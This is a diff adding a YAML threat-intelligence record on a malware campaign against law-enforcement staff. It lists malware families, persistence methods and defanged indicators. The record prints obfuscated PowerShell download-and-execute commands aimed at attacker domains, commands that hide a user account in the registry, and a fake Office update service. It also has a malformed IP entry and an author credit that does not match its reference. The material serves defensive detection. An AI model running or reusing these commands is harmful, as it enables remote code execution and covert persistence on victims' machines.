@@ -1,0 +1,139 @@
+title: 'Unholy trinity: werewolves target law enforcers'
+description: A threat actor is distributing a malicious PC application that unpacks
+  and executes a payload, establishes persistence, and communicates with a C2 server.
+attribution: ''
+malware_families:
+- EchoGather
+- Sliver
+- SoullessRAT
+- AquilaRAT
+cves: []
+ttps:
+  processes:
+  - installer.exe
+  - fondue.exe
+  - appwiz.cpl
+  - second.exe
+  - testexe.exe
+  - updater.exe
+  - MicrosoftOfficeUpdate.exe
+  - mssw.exe
+  command_lines:
+  - powershell -w hidden -ep bypass -c "I''E''X([texT.ENcoDing]::utF8.getsTRING((New-Object
+    System.NeT.WEBCliEnT).dOwnLOADDaTa('hxxp://127.0.0[.]1:5000/373fef3041ec51dd')))"
+  - powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """%LOCALAPPDATA%\Star\run-script.ps1"""
+  - powershell -w hidden -ep bypass -c "I''E''X([texT.ENcoDing]::utF8.getsTRING((New-Object
+    System.NeT.WEBCliEnT).dOwnLOADDaTa('hxxps://newfolder[.]click/9ebeb834a451460e')))"
+  - powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework;
+    [System.Windows.MessageBox]::Show('Error496e7374616c6c6174696f6e206572726f723a20566964656f2061646170746572206f66206e65656465642076657273696f6e20776173206e6f7420666f756e642e',
+    'Error 0x80131509', 'OK', 'Error')"
+  - powershell -Command "Start-Process '%TEMP%\starter<random_num>\starter.bat' -Verb
+    runAs -WindowStyle hidden"
+  - '%TEMP%\starter<random_num>\resources\app\second-app\main.bat'
+  - starter.bat
+  - inst.ps1
+  - inst_u.ps1
+  - inst2.ps1
+  - common.ps1
+  - MicrosoftOfficeUpdate.exe --log-to-file
+  - MicrosoftOfficeUpdate.exe --console
+  powershell:
+  - I''E''X([texT.ENcoDing]::utF8.getsTRING((New-Object System.NeT.WEBCliEnT).dOwnLOADDaTa('hxxp://127.0.0[.]1:5000/373fef3041ec51dd')))
+  - I''E''X([texT.ENcoDing]::utF8.getsTRING((New-Object System.NeT.WEBCliEnT).dOwnLOADDaTa('hxxps://newfolder[.]click/9ebeb834a451460e')))
+  - Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Error496e7374616c6c6174696f6e206572726f723a20566964656f2061646170746572206f66206e65656465642076657273696f6e20776173206e6f7420666f756e642e',
+    'Error 0x80131509', 'OK', 'Error')
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  - Get-WmiObject win32_bios).SerialNumbers
+  - Get-WmiObject win32_computersystemproduct).uuid
+  - Get-WmiObject win32_processor).processorid
+  - Get-WmiObject win32_baseboard).serialnumber
+  - New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+    -Force | Out-Null
+  - Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+    -Name $sshUserName -Value 0 -Type DWord
+  - sc create "MicrosoftOfficeUpdate"
+  - sc description "MicrosoftOfficeUpdate" "Microsoft Office Update Service"
+  - sc failure "MicrosoftOfficeUpdate" reset= 3600 actions= run/60000/run/180000/run/600000
+  - sc start "MicrosoftOfficeUpdate"
+  scripts:
+  - Option Explicit Dim shell, fso, scriptDir, ps1Path, cmd Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject") ' Get current folder (where
+    this .vbs is located) scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
+    ' Build full path to the PowerShell script ps1Path = fso.BuildPath(scriptDir,
+    "run-script.ps1") ' Build PowerShell command cmd = "powershell.exe -NoProfile
+    -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & """" ' Run PowerShell
+    (hidden window, wait until finished) shell.Run cmd, 0, False ' Cleanup Set shell
+    = Nothing Set fso = Nothing
+  - Option Explicit Dim shell, fso, scriptDir, ps1Path, cmd Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject") ' Get current folder (where
+    this .vbs is located) scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
+    ' Build full path to the PowerShell script ps1Path = fso.BuildPath(scriptDir,
+    "run-script.ps1") ' Build PowerShell command cmd = "powershell.exe -NoProfile
+    -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & """" ' Run PowerShell
+    (hidden window, wait until finished) shell.Run cmd, 0, False ' Cleanup Set shell
+    = Nothing Set fso = Nothing
+  - common.ps1
+  - inst.ps1
+  - inst_u.ps1
+  - inst2.ps1
+  - main.bat
+  registry_keys:
+  - HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
+  image_loads:
+  - updater.exe
+  - Go dropper
+  - Go2Tunnel
+  - AquilaRAT
+  network_connections:
+  - installer.exe -> 104.194.158[.]63:443
+  - installer.exe -> 203.161.56[.]226:443
+  - installer.exe -> newfolder[.]click:443
+  - updater.exe -> 203.161.56[.]226:443
+  - MicrosoftOfficeUpdate.exe -> updateserv[.]net:443
+  - MicrosoftOfficeUpdate.exe -> servupdate[.]net:80
+  - Go2Tunnel -> 145.223.70[.]69:80
+  - mssw.exe -> 104.194.158.63[.]65
+  file_activity:
+  - '%TEMP%\temp_57df6638-bbec-41ed-ba1c-25eb734c812c.xlsx'
+  - '%APPDATA%\Microsoft\Windows\mssw.exe'
+  - '%APPDATA%\Microsoft\Windows\msms.exe'
+  - '%PROGRAMDATA%\29167fc2-cdc7-490d-9c70-96bfb9b58225\fondue.exe'
+  - C:\Program Files\Microsoft sync\
+  - C:\Program Files\Microsoft Office Update\
+  - C:\Users\<current_username>\.ssh\authorized_keys
+  persistence:
+  - Task Scheduler: MicrosoftEdgeUpdateTaskMachineUA{GUID}
+  - Registry Run key (HKLM) pointing to MicrosoftOfficeUpdate.exe
+  - Service creation: MicrosoftOfficeUpdate
+  process_relations:
+  - updater.exe -> MicrosoftOfficeUpdate.exe
+iocs:
+  hashes: []
+  ip_addresses:
+  - 104.194.158[.]63
+  - 203.161.56[.]226
+  - 145.223.70[.]69
+  domains:
+  - syncheaven[.]online
+  - re-link[.]space
+  - mystarlink[.]org
+  - web-tellegram[.]org
+  - battleflight[.]org
+  - battleflight[.]pro
+  - stardebug[.]app
+  - alphafly-drones[.]com
+  - newfolder[.]click
+  - updateserv[.]net
+  - servupdate[.]net
+  urls:
+  - hxxps://web-tellegram[.]org/socket.io/?EIO=4&transport=polling&t=ikzknftw&sid=0TY7i-pDpxsIn8b4ABJ6
+  - hxxps://battleflight[.]org/download/installerhosted
+  - hxxps://stardebug[.]app/static/files/StarDebug_1.0.1.msi
+  - hxxps://www.alphafly-drones[.]com/downloads/AlphaFlyInstallV1-2.msi
+  - hxxps://servupdate[.]net/array/array9.json
+  - https://nodejs.org/dist/v22.16.0/node-v22.16.0-win-x64.zip
+authors:
+- Positive Technologies
+reference: https://bi.zone/eng/expertise/blog/triedinoe-zlo-oborotni-atakuyut-sotrudnikov-silovykh-struktur
+date_of_publication: December 01, 2025
+file_creation_date: May 01, 2026
